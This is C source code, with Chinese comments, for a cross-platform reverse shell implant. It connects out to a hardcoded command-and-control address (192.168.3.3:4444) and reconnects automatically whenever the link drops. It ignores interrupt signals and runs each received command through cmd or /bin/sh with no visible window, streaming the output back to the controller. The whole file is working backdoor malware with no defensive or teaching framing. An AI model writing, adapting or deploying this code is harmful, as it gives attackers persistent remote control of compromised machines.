#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
    #include <direct.h>
    #pragma comment(lib, "ws2_32.lib")
    #define chdir _chdir
    #define getcwd _getcwd
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <sys/wait.h>
    #include <signal.h>
    #include <fcntl.h>
    #include <sys/select.h>
#endif

// 你可以根据需要修改 C2 的 IP 和端口
#define C2_IP "192.168.3.3" 
#define C2_PORT 4444
#define BUF_SIZE 8192

// --- 真正的正统执行器：防卡死、防断线完全体 ---
void execute_no_timeout(int sock, char* raw_cmd) {
#ifdef _WIN32
    // ================= Windows 平台：纯非阻塞轮询（防卡死） =================
    char cmdline[BUF_SIZE + 64];
    snprintf(cmdline, sizeof(cmdline), "cmd /c \"%s\"", raw_cmd);

    HANDLE hChildStd_OUT_Rd = NULL;
    HANDLE hChildStd_OUT_Wr = NULL;
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0)) return;
    SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hChildStd_OUT_Wr;  
    siStartInfo.hStdOutput = hChildStd_OUT_Wr; 
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    if (CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &siStartInfo, &piProcInfo)) {
        CloseHandle(hChildStd_OUT_Wr);

        char buffer[BUF_SIZE];
        DWORD dwRead;
        DWORD dwAvail = 0;

        while (1) {
            if (!PeekNamedPipe(hChildStd_OUT_Rd, NULL, 0, NULL, &dwAvail, NULL)) break;

            if (dwAvail > 0) {
                if (ReadFile(hChildStd_OUT_Rd, buffer, sizeof(buffer) - 1, &dwRead, NULL) && dwRead > 0) {
                    buffer[dwRead] = '\0';
                    if (send(sock, buffer, (int)dwRead, 0) < 0) {
                        TerminateProcess(piProcInfo.hProcess, 0);
                        break;
                    }
                }
            } else {
                fd_set read_fds;
                struct timeval tv;
                FD_ZERO(&read_fds);
                FD_SET(sock, &read_fds);
                tv.tv_sec = 0; 
                tv.tv_usec = 0;

                int select_res = select(0, &read_fds, NULL, NULL, &tv);
                if (select_res > 0) {
                    char test_buf[1];
                    int recv_res = recv(sock, test_buf, 1, MSG_PEEK);
                    if (recv_res == 0 || (recv_res < 0 && WSAGetLastError() != WSAEWOULDBLOCK)) {
                        TerminateProcess(piProcInfo.hProcess, 0);
                        break;
                    }
                }

                DWORD exitCode;
                GetExitCodeProcess(piProcInfo.hProcess, &exitCode);
                if (exitCode != STILL_ACTIVE) {
                    while (ReadFile(hChildStd_OUT_Rd, buffer, sizeof(buffer) - 1, &dwRead, NULL) && dwRead > 0) {
                        send(sock, buffer, (int)dwRead, 0);
                    }
                    break;
                }
                Sleep(50);
            }
        }
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);
    } else {
        CloseHandle(hChildStd_OUT_Wr);
    }
    CloseHandle(hChildStd_OUT_Rd);

#else
    // ================= Linux 平台：防死锁、防断连僵尸 =================
    int pipefd[2];
    if (pipe(pipefd) < 0) return;

    pid_t pid = fork();
    if (pid < 0) { close(pipefd[0]); close(pipefd[1]); return; }

    if (pid == 0) {
        // 子进程
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        
        // 【防线 1】把子进程及其孙子进程（比如 ping）扔进独立进程组
        setpgid(0, 0);
        execl("/bin/sh", "sh", "-c", raw_cmd, (char *)NULL);
        exit(1);
    }

    // 父进程
    close(pipefd[1]);
    
    // 把管道读端设为非阻塞
    int flags = fcntl(pipefd[0], F_GETFL, 0);
    fcntl(pipefd[0], F_SETFL, flags | O_NONBLOCK);

    char buffer[BUF_SIZE];
    while (1) {
        fd_set read_fds;
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 100000; // 0.1 秒超时
        
        FD_ZERO(&read_fds);
        FD_SET(pipefd[0], &read_fds); // 监听管道回显
        FD_SET(sock, &read_fds);       // 监听 Socket 死活

        int max_fd = (pipefd[0] > sock) ? pipefd[0] : sock;
        int select_res = select(max_fd + 1, &read_fds, NULL, NULL, &tv);

        if (select_res > 0) {
            // 1. 检查 Socket 是不是断开了
            if (FD_ISSET(sock, &read_fds)) {
                char test_buf[1];
                int recv_res = recv(sock, test_buf, 1, MSG_PEEK);
                if (recv_res == 0 || (recv_res < 0 && errno != EAGAIN && errno != EWOULDBLOCK)) {
                    // 控制端掐线了，直接强杀整个子进程组！
                    kill(-pid, SIGKILL);
                    break; 
                }
            }

            // 2. 检查管道有没有数据吐出来
            if (FD_ISSET(pipefd[0], &read_fds)) {
                ssize_t r_len = read(pipefd[0], buffer, sizeof(buffer) - 1);
                if (r_len > 0) {
                    buffer[r_len] = '\0';
                    if (send(sock, buffer, r_len, MSG_NOSIGNAL) < 0) {
                        kill(-pid, SIGKILL);
                        break;
                    }
                }
            }
        }

        // 3. 检查子进程是不是自己正常跑完了
        int status;
        pid_t result = waitpid(pid, &status, WNOHANG); // 使用 WNOHANG 非阻塞等待！
        if (result == pid || result < 0) {
            // 命令执行完了，把管道里最后剩下的数据吸干
            ssize_t r_len;
            while ((r_len = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
                send(sock, buffer, r_len, MSG_NOSIGNAL);
            }
            break;
        }
    }
    
    close(pipefd[0]);
    // 彻底收尾，防止僵尸进程
    waitpid(pid, NULL, WNOHANG);
#endif
}

// --- 主程序入口 ---
int main() {
#ifndef _WIN32
    signal(SIGINT, SIG_IGN);   
    signal(SIGPIPE, SIG_IGN);  
#endif

#ifdef _WIN32
    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

    char buf[BUF_SIZE];
    char path[512];

    while (1) {
        int s;
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(C2_PORT);
        addr.sin_addr.s_addr = inet_addr(C2_IP);

        while (1) {
            s = (int)socket(AF_INET, SOCK_STREAM, 0);
            if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) >= 0) {
                break; 
            }
#ifdef _WIN32
            closesocket(s); Sleep(5000); 
#else
            close(s); sleep(5);
#endif
        }
        
        send(s, "[*] 状态流模式已开启。已成功防断线，支持自动重连！\n", 48, 0);

        while (1) {
            getcwd(path, sizeof(path));
            char prompt[600];
            snprintf(prompt, sizeof(prompt), "\n[%s] shell-> ", path);
            
            if (send(s, prompt, (int)strlen(prompt), 0) < 0) {
                break; 
            }

            memset(buf, 0, BUF_SIZE);
            int len = (int)recv(s, buf, BUF_SIZE - 1, 0);
            if (len <= 0) break; // 控制端掐断，立刻触发重连
            
            buf[strcspn(buf, "\r\n")] = 0;
            if (strlen(buf) == 0) continue;
            
            if (strcmp(buf, "exit") == 0) {
#ifdef _WIN32
                closesocket(s); WSACleanup();
#else
                close(s);
#endif
                return 0;
            }

            if (strncmp(buf, "cd ", 3) == 0) {
                chdir(buf + 3);
                continue;
            }

            execute_no_timeout(s, buf);
        }

#ifdef _WIN32
        closesocket(s); Sleep(2000);  
#else
        close(s); sleep(2);           
#endif
    }  

#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}